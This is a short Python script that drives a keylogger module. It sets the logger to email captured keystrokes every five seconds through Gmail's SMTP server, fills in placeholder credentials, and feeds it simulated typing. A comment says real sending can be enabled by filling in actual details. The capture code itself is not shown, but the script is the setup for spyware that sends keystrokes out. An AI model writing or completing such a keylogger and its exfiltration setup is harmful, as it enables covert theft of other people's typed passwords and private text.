import time
from keylogger import Keylogger

if __name__ == "__main__":
    # Replace with your details if you want to enable real sending
    email_settings = {
        "email": "your_email@example.com",
        "password": "your_app_password_or_token",
        "smtp_server": "smtp.gmail.com",
        "port": 587,
    }

    # Report via EMAIL every 5 seconds (uses mock print if MailSender isn't configured)
    logger = Keylogger(interval=5, report_method="email", email_config=email_settings)
    logger.start()

    # Simulate some typing
    for ch in list("Email demo text..."):
        logger.key_press(ch)
        time.sleep(0.2)

    time.sleep(6)
    logger.stop()
